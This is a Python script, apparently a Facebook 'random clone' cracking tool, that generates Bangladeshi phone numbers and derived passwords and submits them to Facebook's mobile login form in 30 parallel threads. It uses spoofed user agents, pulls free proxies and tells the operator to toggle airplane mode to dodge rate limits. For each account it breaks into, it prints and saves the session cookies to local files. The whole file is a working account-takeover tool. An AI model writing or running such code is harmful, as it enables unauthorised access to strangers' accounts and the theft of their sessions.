#────────────────────────  Coded by RIDDU NOOB ────────────────────────#

''' CREATE BY RIDDU NOOB REAL NAME HRIDOY HOSSAIN '''

#──────────────────────── Models ────────────────────────#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

#─────────────────────────── COOLER'S CODE ETC.. ───────────────────────────#

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

#─────────────────────────── PROXY && USEAR AGENT ───────────────────────────#

try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print(' PREMIUM CREATE BY RIDDU NOOB ')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Infinix X6811 Build/RP1A.200720.011; wv'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
os.system('xdg-open https://github.com/Hridoy0777')

#─────────────────────────── IMPORTING TIME MODULS ───────────────────────────#

from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
def clear():
        os.system('clear')
        print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
#─────────────────────────── DATE Checker ───────────────────────────#

def joined(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif uid[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif uid[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
        elif uid[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif uid[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif uid[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif uid[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif uid[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif uid[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif uid[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif uid[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif uid[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif uid[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif uid[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        else:creation=''
    elif len(uid) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(uid)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(uid)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation=''
    return creation

#─────────────────────────── Logo ───────────────────────────#

logo= ("""        
        \x1b[38;5;84m┏┓                  
        \x1b[38;5;84m┃┃┏┓┏┓┏┓  ┏┏┓┓┏┏┓┏┏┓
        ┗┛┣┛┗ ┛┗  ┛┗┛┗┻┛ ┗┗ 
        \x1b[38;5;84m  ┛                  \033[0;37;47m\033[1;37;47m\033[1;91m[V.4]\033[1;37;40m
\x1b[38;5;75m──────────────────────────────────────────────                 
\033[1;91m┏[\033[1;92m✓\033[1;91m]\x1b[38;5;115m DEVLOPER  \x1b[38;5;222m┏➤ \x1b[38;5;78m RIDDU NOOB 
\033[1;91m┣[\033[1;92m✓\033[1;91m]\x1b[38;5;115m FACEBOOK  \x1b[38;5;222m┣➤ \x1b[38;5;78m Riddu999
\033[1;91m┣[\033[1;92m✓\033[1;91m]\x1b[38;5;115m WHATSAPP  \x1b[38;5;222m┣➤  \x1b[38;5;78m+8801906312645
\033[1;91m┗[\033[1;92m✓\033[1;91m]\x1b[38;5;115m TOOLS     \x1b[38;5;222m┗➤  \x1b[38;5;78mRANDOM CLONE    \033[1;33m(\x1b[38;5;197mOPEN SOURCE\033[1;33m)
\x1b[38;5;75m──────────────────────────────────────────────""")

#─────────────────────────── Line ───────────────────────────#

def linex():
	print(f'\x1b[38;5;75m──────────────────────────────────────────────')

#─────────────────────────── MENU ───────────────────────────#

class Hridoy:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(f'\x1b[38;5;155m┏➤  [1] RANDOM CRACK ')
        print(f'\x1b[38;5;155m┗➤  [2] EXIT TOOLS ');linex()
        Bristy=input('\x1b[38;5;155m[➤] YOUR CHOICE : ')
        os.system('xdg-open https://facebook.com/Riddu999')
        if Bristy in ["1", "01"]:
            num()
        if Bristy in [" 0", "00"]:
            exit()
        else:
            exit()

#─────────────────────────── BD Creek Process [A] ───────────────────────────#

def num():
    user=[]
    os.system('clear')
    print(logo)
    print(f'\x1b[38;5;155m[✧] BD SIM CODE : 017 . 016 . 018 . 019 ')
    linex()
    kode = input(f'\x1b[38;5;155m[➤] YOUR CHOICE : ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(f'\x1b[38;5;155m[✧] LIMIT EXAMPLE : 5000,10000,50000 ');linex()
    limit = int(input('\x1b[38;5;155m[➤] YOUR CHOICE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as Bismillah:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;91m┏[\033[1;92m✓\033[1;91m] \x1b[1;96mTOTAL FINDING IDZ :\x1b[38;5;205m '+tl)
        print("\033[1;91m┣[\033[1;92m✓\033[1;91m] \x1b[1;96mCLONING STARTED   : TIME \033[0;37;47m\033[1;37;47m\033[1;91m"+str(a)+"\033[1;91m:\033[1;91m"+str(lt()[4])+"\033[1;37;40m "+ tag+"")
        print('\033[1;91m┗[\033[1;92m✓\033[1;91m] \x1b[1;96mUSE FLIGHT \033[1;92m[\x1b[38;5;205mAIRPLANE\033[1;92m] \x1b[1;96mMODE IN EVERY 5 MINUTES');linex()
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            Bismillah.submit(rcrack1,uid,pwx,tl)
    print('TOTAL OK \033[1;92m'+str(len(oks)))

#─────────────────────────── BD Creek Process [A] ───────────────────────────#

def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r\x1b[38;5;155m[➤] FINDING [A]  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pss":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '1.712499976158142', 'origin': 'https://mbasic.facebook.com', 'referer': 'https://m.facebook.com/', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"', 'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5778.218", "Google Chrome";v="116.0.5778.218"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '"SM-A326BR"', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '""', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'\r\x1b[38;5;84m[LIVE] '+uid+' [×] '+ps+' CREATE DATE : '+joined(uid)+'\x1b[38;5;155m')
                print(f'\033[1;92m[\x1b[38;5;197mCOOKIE\033[1;92m] : \x1b[38;5;222m '+coki+'\x1b[38;5;223m');linex()
                open('/sdcard/RIDDU-OKS_C.txt','a').write(uid+' | '+pas+'\n[×]'+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[CP] {cid} | {ps}")
                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass

#─────────────────────────── Locke - Remover [A] ───────────────────────────#

#def remove_LC(uid):
        #_noob_x = str(requests.get(f'https://livedeadsegs.pythonanywhere.com/segs_uid?uid='+uid+' ').text)
        #if 'LIVE' in _noob_x:
            #return 'Active'
        #else:
            #return 'Locked'


Hridoy()
